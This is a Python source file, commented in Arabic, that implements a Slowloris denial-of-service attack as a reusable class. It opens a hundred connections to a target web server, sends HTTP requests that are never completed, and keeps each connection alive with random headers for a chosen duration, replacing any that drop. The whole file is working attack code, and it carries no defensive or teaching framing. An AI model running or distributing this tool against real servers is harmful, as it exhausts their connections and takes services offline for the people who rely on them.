#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import socket
import random
import time
import threading

class Slowloris:
    def __init__(self, target_host, target_port, stats_callback=None):
        self.target_host = target_host
        self.target_port = target_port
        self.stats_callback = stats_callback
        self.sockets = []
        
    def create_socket(self):
        """إنشاء socket جديد مع إبقاء الاتصال مفتوحاً"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(4)
            sock.connect((self.target_host, self.target_port))
            
            # إرسال طلب HTTP غير مكتمل
            sock.send(f"GET /{random.randint(0, 2000)} HTTP/1.1\r\n".encode())
            sock.send(f"Host: {self.target_host}\r\n".encode())
            sock.send("User-Agent: Mozilla/5.0\r\n".encode())
            sock.send("Accept-language: en-US,en\r\n".encode())
            
            if self.stats_callback:
                self.stats_callback(success=True)
            return sock
            
        except Exception:
            if self.stats_callback:
                self.stats_callback(success=False)
            return None
            
    def keep_alive(self, sock):
        """الحفاظ على الاتصال مفتوحاً"""
        try:
            sock.send(f"X-{random.randint(1, 5000)}: {random.randint(1, 5000)}\r\n".encode())
            return True
        except Exception:
            return False
            
    def attack(self, duration):
        """تنفيذ هجوم Slowloris"""
        start_time = time.time()
        
        # إنشاء اتصالات أولية
        for _ in range(100):
            sock = self.create_socket()
            if sock:
                self.sockets.append(sock)
                
        # الحفاظ على الاتصالات
        while time.time() - start_time < duration:
            for sock in self.sockets[:]:
                if not self.keep_alive(sock):
                    self.sockets.remove(sock)
                    new_sock = self.create_socket()
                    if new_sock:
                        self.sockets.append(new_sock)
            time.sleep(5)
